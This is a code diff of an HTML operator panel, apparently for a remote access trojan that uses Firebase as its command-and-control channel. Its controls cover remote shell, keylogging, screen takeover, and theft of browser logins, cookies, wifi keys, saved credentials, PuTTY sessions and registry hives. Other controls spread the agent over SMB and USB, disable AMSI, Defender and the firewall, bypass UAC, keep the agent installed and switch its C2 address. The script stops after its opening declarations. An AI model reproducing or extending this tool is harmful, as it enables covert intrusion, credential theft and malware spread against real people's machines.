@@ -1,146 +1,220 @@
 <!doctype html>
 <html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
 <title>Fleet Console</title>
 <style>
-:root{--bg:#070a0e;--pn:#0d141c;--pn2:#121c26;--ln:#1a2733;--tx:#c6d6e5;--dim:#67809a;
---ac:#38bdf8;--ok:#22c55e;--wr:#f59e0b;--er:#ef4444;--mono:ui-monospace,Menlo,Consolas,monospace}
-*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#06090d;--pn:#0c131a;--pn2:#111b24;--ln:#192632;--tx:#c6d6e5;--dim:#66809a;
+--ac:#38bdf8;--ok:#22c55e;--wr:#f59e0b;--er:#ef4444;--vi:#a78bfa;
+--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 body{background:var(--bg);color:var(--tx);font:13px/1.5 var(--mono);overflow:hidden}
-button{font:inherit;color:inherit;background:var(--pn2);border:1px solid var(--ln);
-padding:6px 12px;border-radius:7px;cursor:pointer;transition:.12s}
+button{font:inherit;color:inherit;background:var(--pn2);border:1px solid var(--ln);padding:6px 12px;
+border-radius:8px;cursor:pointer;transition:.14s;white-space:nowrap}
 button:hover{border-color:var(--ac);color:var(--ac)}
-button:active{transform:scale(.97)}
-button:disabled{opacity:.35}
-button.pri{background:linear-gradient(180deg,#0ea5e9,#0284c7);color:#021018;border-color:#38bdf8;font-weight:700}
+button:active{transform:scale(.96)}
+button:disabled{opacity:.35;cursor:not-allowed}
+button.pri{background:linear-gradient(180deg,#0ea5e9,#0284c7);color:#021018;border-color:var(--ac);font-weight:700}
 button.dgr{border-color:#5c2626;color:#fca5a5}
-input,textarea,select{font:inherit;background:#05090d;border:1px solid var(--ln);color:var(--tx);
-padding:7px 10px;border-radius:7px;width:100%;outline:none}
-input:focus,textarea:focus{border-color:var(--ac);box-shadow:0 0 0 3px #38bdf818}
-::-webkit-scrollbar{width:9px;height:9px}
-::-webkit-scrollbar-thumb{background:#233342;border-radius:6px}
-#app{display:grid;grid-template-columns:296px 1fr;grid-template-rows:52px 1fr 50px;height:100vh}
-#top{grid-column:1/-1;display:flex;align-items:center;gap:9px;padding:0 14px;
-background:linear-gradient(180deg,#0e1720,#080d13);border-bottom:1px solid var(--ln)}
-#brand{font-weight:800;letter-spacing:3px;color:var(--ac);display:flex;gap:7px;align-items:center}
-#brand i{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);animation:p 2s infinite}
-@keyframes p{50%{opacity:.3}}
-#search{max-width:230px}
-.chip{padding:4px 11px;border:1px solid var(--ln);border-radius:20px;font-size:11px;color:var(--dim);cursor:pointer}
+button.dgr:hover{background:#221010;border-color:var(--er);color:var(--er)}
+button.gh{background:none}
+input,textarea,select{font:inherit;background:#04080c;border:1px solid var(--ln);color:var(--tx);
+padding:7px 10px;border-radius:8px;width:100%;outline:none;transition:.14s}
+input:focus,textarea:focus,select:focus{border-color:var(--ac);box-shadow:0 0 0 3px #38bdf81a}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-thumb{background:#22323f;border-radius:6px}
+::-webkit-scrollbar-track{background:transparent}
+
+#app{display:grid;grid-template-columns:290px 1fr;grid-template-rows:50px 1fr 48px;height:100vh;height:100dvh}
+#top{grid-column:1/-1;display:flex;align-items:center;gap:8px;padding:0 12px;
+background:linear-gradient(180deg,#0d1620,#070c12);border-bottom:1px solid var(--ln);z-index:60}
+#brand{font-weight:800;letter-spacing:3px;color:var(--ac);display:flex;gap:7px;align-items:center;font-size:12px}
+#brand i{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 10px var(--ok);animation:breath 2s infinite}
+@keyframes breath{50%{opacity:.25}}
+#seg{display:flex;border:1px solid var(--ln);border-radius:8px;overflow:hidden}
+#seg button{border:none;border-radius:0;font-size:11px;padding:5px 11px;background:none;color:var(--dim)}
+#seg button.on{background:#0c2b3c;color:var(--ac)}
+#link{font-size:10px;padding:3px 9px;border-radius:20px;border:1px solid var(--ln);color:var(--dim);transition:.2s}
+#link.dir{border-color:#166534;background:#082016;color:#6ee7a8}
+#link.live{border-color:#166534;background:#082016;color:#6ee7a8;animation:breath 1.5s infinite}
+#search{max-width:210px}
+.chip{padding:4px 10px;border:1px solid var(--ln);border-radius:20px;font-size:11px;color:var(--dim);cursor:pointer;transition:.14s}
 .chip.on{background:#0c2b3c;border-color:var(--ac);color:var(--ac)}
-#rolebadge{font-size:10px;padding:3px 9px;border-radius:20px;border:1px solid #3b2a5c;background:#1c1430;color:#c4a5f5;letter-spacing:1px}
-#conn{font-size:10px;padding:3px 9px;border-radius:20px;border:1px solid var(--ln);color:var(--dim)}
-#conn.dir{border-color:#166534;background:#0a2016;color:#6ee7a8;animation:p 1.6s infinite}
-#rail{background:#080e14;border-right:1px solid var(--ln);overflow-y:auto;padding:8px}
-.dev{display:flex;gap:9px;padding:9px;border:1px solid var(--ln);border-radius:9px;margin-bottom:6px;
-cursor:pointer;background:var(--pn);position:relative}
-.dev:hover{border-color:#2d4759;background:var(--pn2)}
-.dev.sel{border-color:var(--ac);background:#0e1e29}
-.av{width:32px;height:32px;border-radius:8px;background:#16232e;display:grid;place-items:center;
-font-weight:700;color:#7dd3fc;flex:0 0 32px;font-size:12px}
-.dev.on .av{background:#0d2a1c;color:#6ee7a8}
-.dev .nm{font-weight:700;color:#e6f0f9;font-size:12px;word-break:break-all}
-.dev .sub{font-size:10px;color:var(--dim);display:flex;gap:6px;flex-wrap:wrap}
-.dot{position:absolute;right:8px;top:8px;width:7px;height:7px;border-radius:50%;background:#4b2a2a}
+#hamb{display:none}
+
+#rail{background:#070d13;border-right:1px solid var(--ln);overflow-y:auto;padding:8px;transition:.22s}
+#railhead{display:flex;justify-content:space-between;align-items:center;padding:2px 6px 8px;
+font-size:10px;letter-spacing:1.2px;color:var(--dim)}
+.dev{position:relative;display:flex;gap:9px;padding:9px;border:1px solid var(--ln);border-radius:10px;
+margin-bottom:6px;cursor:pointer;background:var(--pn);transition:.15s;animation:fade .22s}
+@keyframes fade{from{opacity:0;transform:translateY(-4px)}}
+.dev:hover{border-color:#2c4557;background:var(--pn2)}
+.dev.sel{border-color:var(--ac);background:#0d1e2a;box-shadow:inset 0 0 0 1px #38bdf830}
+.avwrap{position:relative;flex:0 0 34px}
+.av{width:34px;height:34px;border-radius:9px;background:#14212c;display:grid;place-items:center;
+font-weight:700;color:#7dd3fc;font-size:11px;overflow:hidden}
+.dev.on .av{background:#0c2a1b;color:#6ee7a8}
+.dev.on .avwrap::after{content:"";position:absolute;inset:-3px;border-radius:11px;
+border:1px solid var(--ok);opacity:.55;animation:ring 1.8s infinite}
+@keyframes ring{0%{transform:scale(.94);opacity:.7}70%{transform:scale(1.14);opacity:0}100%{opacity:0}}
+.dev .nm{font-weight:700;font-size:12px;color:#e6f0f9;word-break:break-all;display:flex;gap:5px;align-items:center;flex-wrap:wrap}
+.dev .sub{font-size:10px;color:var(--dim);display:flex;gap:6px;flex-wrap:wrap;margin-top:1px}
+.bdg{font-size:8px;padding:1px 5px;border-radius:3px;border:1px solid #3b2a5c;background:#1b1330;color:#c4a5f5}
+.os{font-size:10px;opacity:.75}
+.dot{position:absolute;right:7px;top:7px;width:7px;height:7px;border-radius:50%;background:#4b2a2a}
 .dev.on .dot{background:var(--ok);box-shadow:0 0 7px var(--ok)}
-.bdg{font-size:8px;padding:1px 5px;border-radius:3px;border:1px solid #3b2a5c;background:#1c1430;color:#c4a5f5}
+
 #main{overflow:hidden;display:flex;flex-direction:column}
-#empty{flex:1;display:grid;place-items:center;color:#3f5769;gap:6px;text-align:center}
-#empty b{letter-spacing:4px;font-size:15px}
-#dv{display:none;flex:1;flex-direction:column;overflow:hidden}
+#empty{flex:1;display:grid;place-items:center;text-align:center;color:#3d5567;gap:8px;padding:20px}
+#empty b{letter-spacing:4px;font-size:14px}
+#empty small{font-size:11px;color:#33485a;max-width:280px}
+#dv{display:none;flex:1;flex-direction:column;overflow:hidden;animation:fade .2s}
 #dv.on{display:flex}
-#dh{padding:10px 15px;border-bottom:1px solid var(--ln);background:var(--pn);display:flex;gap:12px;align-items:center;flex-wrap:wrap}
-#dh h2{font-size:14px}
-#dh .m{font-size:10px;color:var(--dim);display:flex;gap:10px;flex-wrap:wrap}
-#quick{display:flex;gap:5px;padding:7px 15px;background:#0a1017;border-bottom:1px solid var(--ln);overflow-x:auto}
-#quick button{padding:5px 11px;font-size:11px;border-radius:20px;white-space:nowrap}
-#tabs{display:flex;gap:1px;padding:0 10px;background:#080e14;border-bottom:1px solid var(--ln);overflow-x:auto}
-#tabs button{background:none;border:none;border-bottom:2px solid transparent;border-radius:0;padding:9px 12px;color:var(--dim);font-size:12px;white-space:nowrap}
+#dh{padding:10px 14px;border-bottom:1px solid var(--ln);background:var(--pn);display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+#dh h2{font-size:14px;display:flex;gap:7px;align-items:center}
+#dh .m{font-size:10px;color:var(--dim);display:flex;gap:9px;flex-wrap:wrap}
+#quick{display:flex;gap:5px;padding:7px 14px;background:#080f16;border-bottom:1px solid var(--ln);overflow-x:auto;scrollbar-width:none}
+#quick::-webkit-scrollbar{display:none}
+#quick button{padding:5px 11px;font-size:11px;border-radius:20px}
+#tabs{display:flex;gap:1px;padding:0 8px;background:#070d13;border-bottom:1px solid var(--ln);overflow-x:auto;scrollbar-width:none}
+#tabs::-webkit-scrollbar{display:none}
+#tabs button{background:none;border:none;border-bottom:2px solid transparent;border-radius:0;
+padding:9px 11px;color:var(--dim);font-size:12px}
 #tabs button.on{color:var(--ac);border-bottom-color:var(--ac)}
-#body{flex:1;overflow:auto;padding:13px 15px}
-.pane{display:none}.pane.on{display:block}
-pre{background:#04080c;border:1px solid var(--ln);border-radius:8px;padding:10px;max-height:430px;
+#body{flex:1;overflow:auto;padding:13px 14px}
+.pane{display:none;animation:fade .18s}
+.pane.on{display:block}
+pre{background:#03070a;border:1px solid var(--ln);border-radius:9px;padding:10px;max-height:430px;
 overflow:auto;white-space:pre-wrap;word-break:break-all;color:#a3c1d6;font-size:12px}
 .row{display:flex;gap:7px;align-items:center;margin-bottom:9px;flex-wrap:wrap}
 .row input{flex:1;min-width:110px}
-.card{background:var(--pn);border:1px solid var(--ln);border-radius:9px;padding:12px;margin-bottom:10px}
-.card h4{font-size:10px;letter-spacing:1.4px;color:var(--ac);margin-bottom:8px}
+.card{background:var(--pn);border:1px solid var(--ln);border-radius:10px;padding:12px;margin-bottom:10px}
+.card h4{font-size:10px;letter-spacing:1.4px;color:var(--ac);margin-bottom:9px;font-weight:600}
 .g2{display:grid;grid-template-columns:1fr 1fr;gap:9px}
-.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.g3{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
 table{width:100%;border-collapse:collapse;font-size:12px}
-th{text-align:left;font-size:9px;letter-spacing:1px;color:var(--ac);padding:5px;border-bottom:1px solid var(--ln)}
-td{padding:4px;border-bottom:1px solid #101a23;word-break:break-all}
-.tw{max-height:400px;overflow:auto;border:1px solid var(--ln);border-radius:8px}
-#img{max-width:100%;border-radius:8px;border:1px solid var(--ln);cursor:crosshair;background:#04080c}
-#frm{display:grid;place-items:center;background:#04080c;border:1px solid var(--ln);border-radius:8px;padding:6px;min-height:180px}
-#frm img{max-height:58vh}
-#foot{grid-column:1/-1;display:flex;gap:6px;align-items:center;padding:0 12px;
-background:#080e14;border-top:1px solid var(--ln);overflow-x:auto}
-#foot button{font-size:11px;padding:5px 11px;border-radius:20px;white-space:nowrap}
-#toasts{position:fixed;bottom:62px;right:14px;display:flex;flex-direction:column;gap:7px;z-index:400;max-width:330px}
-.tst{padding:10px 13px;border-radius:8px;background:#0f1c26;border:1px solid var(--ln);font-size:12px;
-animation:slide .2s;display:flex;gap:9px;align-items:center;box-shadow:0 8px 26px #000a}
-.tst.ok{border-color:#1f6b3f;background:#08170f;color:#8df0b2}
-.tst.er{border-color:#6d2424;background:#190c0c;color:#fca5a5}
-.tst .sp{width:11px;height:11px;border:2px solid #38bdf8;border-top-color:transparent;border-radius:50%;animation:sp .7s linear infinite}
-@keyframes sp{to{transform:rotate(360deg)}}
-@keyframes slide{from{opacity:0;transform:translateX(26px)}}
-#modal{position:fixed;inset:0;background:#040709e8;display:none;place-items:center;z-index:500;padding:20px}
+th{text-align:left;font-size:9px;letter-spacing:1px;color:var(--ac);padding:5px;border-bottom:1px solid var(--ln);position:sticky;top:0;background:var(--bg)}
+td{padding:4px;border-bottom:1px solid #0f1922;word-break:break-all}
+tr:hover td{background:#0c141c}
+.tw{max-height:400px;overflow:auto;border:1px solid var(--ln);border-radius:9px}
+#frm{display:grid;place-items:center;background:#03070a;border:1px solid var(--ln);border-radius:9px;padding:6px;min-height:170px}
+#frm img{max-height:56vh;max-width:100%;border-radius:6px}
+#img{cursor:crosshair}
+#foot{grid-column:1/-1;display:flex;gap:6px;align-items:center;padding:0 10px;background:#070d13;
+border-top:1px solid var(--ln);overflow-x:auto;scrollbar-width:none}
+#foot::-webkit-scrollbar{display:none}
+#foot button{font-size:11px;padding:5px 11px;border-radius:20px}
+
+#toasts{position:fixed;bottom:60px;right:12px;display:flex;flex-direction:column;gap:7px;z-index:400;max-width:min(340px,86vw)}
+.tst{padding:10px 13px;border-radius:9px;background:#0e1b25;border:1px solid var(--ln);font-size:12px;
+animation:slide .2s;display:flex;gap:9px;align-items:center;box-shadow:0 8px 26px #000b;transition:.2s}
+.tst.ok{border-color:#1f6b3f;background:#07170f;color:#8df0b2}
+.tst.er{border-color:#6d2424;background:#180c0c;color:#fca5a5}
+.tst .sp{width:11px;height:11px;border:2px solid var(--ac);border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;flex:0 0 11px}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes slide{from{opacity:0;transform:translateX(24px)}}
+
+#modal{position:fixed;inset:0;background:#040709e8;display:none;place-items:center;z-index:500;padding:16px}
 #modal.on{display:grid}
-#modal img{max-width:94vw;max-height:88vh;border-radius:9px}
-#pal{position:fixed;inset:0;background:#040709d9;display:none;z-index:600;padding-top:12vh}
+#modal img{max-width:95vw;max-height:88vh;border-radius:9px}
+#pal{position:fixed;inset:0;background:#040709d9;display:none;z-index:600;padding-top:10vh}
 #pal.on{display:block}
-#palbox{max-width:520px;margin:0 auto;background:#0c141c;border:1px solid var(--ln);border-radius:11px;overflow:hidden}
+#palbox{max-width:520px;margin:0 auto;background:#0b131b;border:1px solid var(--ln);border-radius:11px;overflow:hidden}
 #palbox input{border:none;border-bottom:1px solid var(--ln);border-radius:0;padding:13px}
 #palist{max-height:340px;overflow:auto}
-#palist div{padding:8px 13px;cursor:pointer;font-size:12px;border-bottom:1px solid #0e1720}
-#palist div:hover{background:#13212c;color:var(--ac)}
-#bar{position:fixed;left:0;right:0;bottom:50px;height:3px;background:#0b141c;display:none}
+#palist div{padding:8px 13px;cursor:pointer;font-size:12px;border-bottom:1px solid #0c141c}
+#palist div:hover{background:#111e28;color:var(--ac)}
+#bar{position:fixed;left:0;right:0;bottom:48px;height:2px;display:none;z-index:300}
 #bar.on{display:block}
-#bar i{display:block;height:100%;width:35%;background:linear-gradient(90deg,#0ea5e9,#38bdf8);animation:load 1s infinite}
-@keyframes load{0%{margin-left:-35%}100%{margin-left:100%}}
+#bar i{display:block;height:100%;width:30%;background:linear-gradient(90deg,#0ea5e9,#38bdf8);animation:load 1.1s infinite}
+@keyframes load{0%{margin-left:-30%}100%{margin-left:100%}}
+
+#connpane{display:none;padding:11px 14px;background:#0a1420;border-bottom:1px solid #17364d;gap:8px;flex-wrap:wrap;align-items:center}
+#connpane.on{display:flex}
+#connpane input{max-width:150px}
+#lat{font-size:10px;color:var(--ok)}
+
+.skel{height:11px;border-radius:4px;background:linear-gradient(90deg,#0e1822,#16232f,#0e1822);background-size:200% 100%;animation:sk 1.2s infinite}
+@keyframes sk{to{background-position:-200% 0}}
+.emptyhint{color:#40586b;font-size:11px;padding:12px;text-align:center}
+
+@media(max-width:860px){
+  #app{grid-template-columns:1fr}
+  #rail{position:fixed;top:50px;bottom:48px;left:0;width:84vw;max-width:320px;z-index:70;transform:translateX(-102%);box-shadow:18px 0 40px #000a}
+  #rail.open{transform:translateX(0)}
+  #hamb{display:inline-block}
+  #search{max-width:110px;font-size:12px}
+  #brand span{display:none}
+  .g2{grid-template-columns:1fr}
+  #body{padding:10px}
+  #dh h2{font-size:13px}
+}
 </style></head><body>
 <div id="app">
 <header id="top">
- <div id="brand"><i></i>FLEET</div>
- <span id="rolebadge">__ROLE__</span>
- <span id="conn">firebase</span>
- <input id="search" placeholder="search host / user / ip  ·  Ctrl+K">
+ <button class="gh" id="hamb" onclick="railToggle()">☰</button>
+ <div id="brand"><i></i><span>FLEET</span></div>
+ <div id="seg">
+  <button id="mfb" class="on" onclick="setMode('fb')">firebase</button>
+  <button id="mdr" onclick="setMode('direct')">direct</button>
+ </div>
+ <span id="link">fb</span>
+ <input id="search" placeholder="host · user · ip" autocomplete="off">
  <span class="chip on" data-f="all">all</span>
- <span class="chip" data-f="on">online</span>
- <span class="chip" data-f="adm">admin</span>
+ <span class="chip" data-f="on">on</span>
+ <span class="chip" data-f="adm">adm</span>
  <div style="flex:1"></div>
- <button onclick="palette()">commands</button>
- <button onclick="render()">refresh</button>
+ <button onclick="palette()">⌘</button>
+ <button onclick="tick()">⟳</button>
 </header>
 
-<aside id="rail"><div style="font-size:10px;color:var(--dim);padding:2px 6px 8px;letter-spacing:1px">DEVICES <span id="cnt"></span></div><div id="list"></div></aside>
+<div id="connpane">
+ <span style="font-size:10px;color:var(--dim)">MANUAL TARGET</span>
+ <input id="cip" placeholder="ip or host">
+ <input id="cpt" value="7443" placeholder="port" style="max-width:80px">
+ <button class="pri" onclick="manualConnect()">connect</button>
+ <button onclick="openPort()">open port on selected</button>
+ <span id="lat">—</span>
+</div>
+
+<aside id="rail">
+ <div id="railhead"><span>DEVICES</span><span id="cnt">0</span></div>
+ <div id="list"></div>
+ <div style="padding:6px">
+  <button style="width:100%;font-size:11px" onclick="purgeOffline()">purge offline nodes</button>
+ </div>
+</aside>
 
 <main id="main">
- <div id="empty"><b>NO DEVICE</b><span>pick a machine from the rail</span></div>
+ <div id="empty"><b>NO TARGET</b><small>pick a device from the rail, or connect to an IP:port manually</small></div>
  <div id="dv">
-  <div id="dh"><h2 id="dn">—</h2><div class="m" id="dm"></div><div style="flex:1"></div>
-   <button class="pri" onclick="directConnect()" id="dcbtn">connect direct</button></div>
+  <div id="dh">
+   <h2><span id="dos"></span><span id="dn">—</span></h2>
+   <div class="m" id="dm"></div>
+   <div style="flex:1"></div>
+   <button class="pri" id="dcb" onclick="quickDirect()">direct</button>
+   <button class="dgr" onclick="dropDevice()">forget</button>
+  </div>
   <div id="quick"></div>
   <div id="tabs"></div>
   <div id="body">
    <div class="pane on" id="p-con"><div class="row"><input id="ic" placeholder="shell command · Enter" onkeydown="if(event.key==='Enter')exec()"><button class="pri" onclick="exec()">run</button></div><pre id="co">ready</pre></div>
-   <div class="pane" id="p-fil"><div class="row"><input id="fp" value="C:\" onkeydown="if(event.key==='Enter')ls()"><button onclick="ls()">go</button><button onclick="up()">up</button><button onclick="pick()">upload</button><input type="file" id="fi" hidden onchange="upfile(this.files[0])"></div><div class="tw"><table><thead><tr><th>name</th><th>size</th><th>modified</th><th></th></tr></thead><tbody id="fl"></tbody></table></div></div>
-   <div class="pane" id="p-liv"><div class="row"><button class="pri" id="lvb" onclick="liveT()">start</button><span id="li" style="color:var(--dim);font-size:11px">idle</span></div><div class="row"><input id="lt" placeholder="type text · Enter" onkeydown="if(event.key==='Enter'){txt();event.preventDefault()}"><select id="lk" style="max-width:120px" onchange="if(this.value){kbd(this.value);this.value=''}"><option value="">key</option><option value="13">Enter</option><option value="9">Tab</option><option value="27">Esc</option><option value="8">Bksp</option><option value="46">Del</option><option value="91">Win</option><option value="17">Ctrl</option><option value="18">Alt</option></select><select id="lb" style="max-width:100px"><option value="left">left</option><option value="right">right</option></select></div><div id="frm"><img id="img"></div></div>
+   <div class="pane" id="p-fil"><div class="row"><input id="fp" value="C:\" onkeydown="if(event.key==='Enter')ls()"><button onclick="ls()">go</button><button onclick="up()">up</button><button onclick="pick()">upload</button><input type="file" id="fi" hidden onchange="upfile(this.files[0])"></div><div class="tw"><table><thead><tr><th>name</th><th>size</th><th>modified</th><th></th></tr></thead><tbody id="fl"></tbody></table></div><div id="uprog" style="display:none;margin-top:8px"><div style="height:5px;background:#0a131b;border-radius:3px;overflow:hidden"><i id="upbar" style="display:block;height:100%;width:0;background:var(--ac);transition:.2s"></i></div><div style="font-size:10px;color:var(--dim)" id="uptxt"></div></div></div>
+   <div class="pane" id="p-liv"><div class="row"><button class="pri" id="lvb" onclick="liveT()">start</button><span id="li" style="color:var(--dim);font-size:11px">idle</span></div><div class="row"><input id="lt" placeholder="type text · Enter" onkeydown="if(event.key==='Enter'){txt();event.preventDefault()}"><select id="lk" style="max-width:110px" onchange="if(this.value){kbd(this.value);this.value=''}"><option value="">key</option><option value="13">Enter</option><option value="9">Tab</option><option value="27">Esc</option><option value="8">Bksp</option><option value="46">Del</option><option value="91">Win</option><option value="17">Ctrl</option><option value="18">Alt</option></select><select id="lb" style="max-width:95px"><option value="left">left</option><option value="right">right</option></select></div><div id="frm"><img id="img" alt=""></div></div>
    <div class="pane" id="p-key"><div class="row"><button class="pri" onclick="send('keylog',{on:true})">start</button><button onclick="send('keylog',{on:false})">stop</button><button onclick="clr()">clear</button><input id="kf" placeholder="filter" oninput="drawK()"></div><div id="kl" style="font-size:12px;line-height:1.7"></div></div>
-   <div class="pane" id="p-cap"><div class="row"><button onclick="send('shot')">screenshot</button><button onclick="send('cam')">webcam</button></div><div class="g3" id="gal"></div></div>
+   <div class="pane" id="p-cap"><div class="row"><button onclick="send('shot')">screenshot</button></div><div class="g3" id="gal"></div></div>
    <div class="pane" id="p-prc"><div class="row"><button onclick="send('proc')">refresh</button><input id="pf" placeholder="filter" oninput="drawP()"></div><div class="tw"><table><thead><tr><th>pid</th><th>name</th><th>mem</th><th></th></tr></thead><tbody id="pl"></tbody></table></div></div>
    <div class="pane" id="p-svc"><div class="card"><h4>SERVICE</h4><div class="row"><input id="sn" placeholder="service name"><button onclick="sv('query')">query</button><button onclick="sv('start')">start</button><button onclick="sv('stop')">stop</button><button class="dgr" onclick="sv('disable')">disable</button></div></div><pre id="so">—</pre></div>
-   <div class="pane" id="p-reg"><div class="card"><h4>REGISTRY</h4><div class="row"><input id="rp" placeholder="HKLM\SOFTWARE\..."><button onclick="send('reg',{op:'read',path:rp.value})">read</button></div><div class="row"><input id="rn" placeholder="name"><input id="rv" placeholder="value"><button onclick="send('reg',{op:'write',path:rp.value,name:rn.value,val:rv.value})">write</button></div></div><pre id="ro">—</pre></div>
+   <div class="pane" id="p-reg"><div class="card"><h4>REGISTRY</h4><div class="row"><input id="rp" placeholder="HKLM\SOFTWARE\..."><button onclick="send('reg',{op:'read',path:rp.value})">read</button></div><div class="row"><input id="rn" placeholder="name"><input id="rv" placeholder="value"><button onclick="send('reg',{op:'write',path:rp.value,name:rn.value,val:rv.value})">write</button><button class="dgr" onclick="send('reg',{op:'del',path:rp.value,name:rn.value})">del</button></div></div><pre id="ro">—</pre></div>
    <div class="pane" id="p-clp"><div class="row"><button onclick="send('clip')">read</button><button onclick="cs()">write</button></div><pre id="clo">—</pre></div>
-   <div class="pane" id="p-net"><div class="card"><h4>NETWORK</h4><div class="row"><input id="sub" value="192.168.1"><button onclick="send('scan',{sub:sub.value})">scan /24</button><button onclick="send('lan')">arp table</button><button onclick="send('smb')">shares</button></div><div class="row"><input id="dh2" placeholder="host"><button onclick="send('rexec',{host:dh2.value,cmd:'whoami'})">remote whoami</button><button onclick="send('spread')">spread smb</button><button onclick="send('usb')">spread usb</button></div></div><pre id="no">—</pre></div>
-   <div class="pane" id="p-rdp"><div class="card"><h4>REMOTE DESKTOP</h4><div class="row"><button onclick="send('rdp')">enable rdp</button><button onclick="copyRdp()">copy mstsc line</button></div><pre id="rdpo">enable RDP, then run the copied line from your PC.</pre></div></div>
-   <div class="pane" id="p-cre"><div class="row"><button onclick="send('pass')">browser logins</button><button onclick="send('cookies')">cookies</button><button onclick="send('wifi')">wifi keys</button><button onclick="send('cmdkey')">saved creds</button><button onclick="send('hives')">dump hives</button></div><pre id="cro">—</pre></div>
+   <div class="pane" id="p-net"><div class="card"><h4>NETWORK</h4><div class="row"><input id="sub" value="192.168.1"><button onclick="send('scan',{sub:sub.value})">scan /24</button><button onclick="send('lan')">arp</button><button onclick="send('smb')">shares</button><button onclick="send('pubip')">public ip</button></div><div class="row"><input id="rh" placeholder="remote host"><button onclick="send('rexec',{host:rh.value,cmd:'whoami'})">remote whoami</button><button onclick="send('spread')">spread smb</button><button onclick="send('usb')">spread usb</button></div><div class="row"><input id="wmac" placeholder="mac for wol"><button onclick="send('wol',{mac:wmac.value})">wake</button><input id="rpath2" placeholder="path to seed"><button onclick="send('repl',{path:rpath2.value})">replicate</button></div></div><pre id="no">—</pre></div>
+   <div class="pane" id="p-rdp"><div class="card"><h4>REMOTE DESKTOP</h4><div class="row"><button onclick="send('rdp')">enable rdp</button><button onclick="copyRdp()">copy mstsc</button><button onclick="send('info')">refresh ip</button></div><pre id="rdpo">enable RDP first, then run the copied line from your machine.</pre></div></div>
+   <div class="pane" id="p-cre"><div class="row"><button onclick="send('pass')">browser logins</button><button onclick="send('cookies')">cookies</button><button onclick="send('wifi')">wifi</button><button onclick="send('cmdkey')">saved creds</button><button onclick="send('hives')">dump hives</button><button onclick="send('putty')">putty</button><button onclick="send('unattend')">unattend</button></div><pre id="cro">—</pre></div>
+   <div class="pane" id="p-sys"><div class="row"><button onclick="send('info')">info</button><button onclick="send('users')">users</button><button onclick="send('inst')">software</button><button onclick="send('net')">netstat</button><button onclick="send('tasks')">tasks</button><button onclick="send('drv')">drivers</button><button onclick="send('env')">env</button><button onclick="send('vm')">vm check</button></div><div class="row"><input id="wq" placeholder="wmic query"><button onclick="send('wmi',{q:wq.value})">wmi</button></div><pre id="syo">—</pre></div>
    <div class="pane" id="p-ops"><div class="g2">
     <div class="card"><h4>MESSAGE</h4><input id="mt" placeholder="title" style="margin-bottom:6px"><textarea id="mx" rows="2" placeholder="text"></textarea><div class="row" style="margin-top:6px"><button onclick="send('msg',{title:mt.value,text:mx.value})">show</button></div></div>
-    <div class="card"><h4>POWER</h4><div class="row"><button onclick="send('lock')">lock</button><button onclick="send('monoff')">monitor off</button><button onclick="send('power',{mode:'r'})">reboot</button><button class="dgr" onclick="send('power',{mode:'s'})">shutdown</button></div></div>
-    <div class="card"><h4>EVASION</h4><div class="row"><button onclick="send('amsi')">patch amsi</button><button onclick="send('defoff')">defender off</button><button onclick="send('fwoff')">firewall off</button><button onclick="send('uac')">uac bypass</button></div></div>
-    <div class="card"><h4>AGENT</h4><div class="row"><button onclick="send('persist')">reinstall</button><button onclick="send('heal')">heal</button><button onclick="send('httpd',{port:7443})">open 7443</button><button class="dgr" onclick="send('uninst')">uninstall</button></div></div>
+    <div class="card"><h4>POWER</h4><div class="row"><button onclick="send('lock')">lock</button><button onclick="send('monoff')">mon off</button><button onclick="send('power',{mode:'r'})">reboot</button><button class="dgr" onclick="send('power',{mode:'s'})">shutdown</button></div></div>
+    <div class="card"><h4>EVASION</h4><div class="row"><button onclick="send('amsi')">amsi</button><button onclick="send('defoff')">defender off</button><button onclick="send('fwoff')">fw off</button><button onclick="send('uac')">uac</button></div></div>
+    <div class="card"><h4>AGENT</h4><div class="row"><button onclick="send('persist')">reinstall</button><button onclick="send('heal')">heal</button><button onclick="send('httpd',{port:7443})">open 7443</button><button class="dgr" onclick="send('uninst')">uninstall</button></div><div class="row"><input id="c2u" placeholder="new firebase url"><button onclick="send('setc2',{url:c2u.value})">set c2</button></div></div>
    </div></div>
    <div class="pane" id="p-res"><div class="row"><button onclick="RES=[];drawR()">clear</button><select id="rf" style="max-width:120px" onchange="drawR()"><option value="all">all</option><option value="ok">ok</option><option value="bad">fail</option></select></div><div id="rl"></div></div>
   </div>
@@ -151,79 +225,88 @@ animation:slide .2s;display:flex;gap:9px;align-items:center;box-shadow:0 8px 26p
 <div id="bar"><i></i></div>
 <div id="toasts"></div>
 <div id="modal" onclick="if(event.target.id==='modal')closeM()"><img id="mi"></div>
-<div id="pal" onclick="if(event.target.id==='pal')closeP()"><div id="palbox"><input id="pq" placeholder="type a command…" oninput="fillP()"><div id="palist"></div></div></div>
+<div id="pal" onclick="if(event.target.id==='pal')closeP()"><div id="palbox"><input id="pq" placeholder="command…" oninput="fillP()"><div id="palist"></div></div></div>
 
 <script>
-const FB="__FB__", ROLE="__ROLE__";
-const DIRPORT=7443;
-let cur=null, DEV={}, live=false, lvT=null, RES=[], FIL="all", Q="", KL={}, PR=[], BASE=null, lastSel=null;
+const FB="__FB__", ROLE="__ROLE__", DPORT=7443;
+let cur=null, DEV={}, RES=[], FIL="all", Q="", KL={}, PR=[], live=false, lvT=null;
+let MODE="fb", DBASE=null, LAT=0, seq=0, manual={};
+
 const $=(s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
 const esc=s=>String(s??"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
 const slp=ms=>new Promise(r=>setTimeout(r,ms));
+const S=o=>typeof o==="string"?o:JSON.stringify(o,null,1);
 
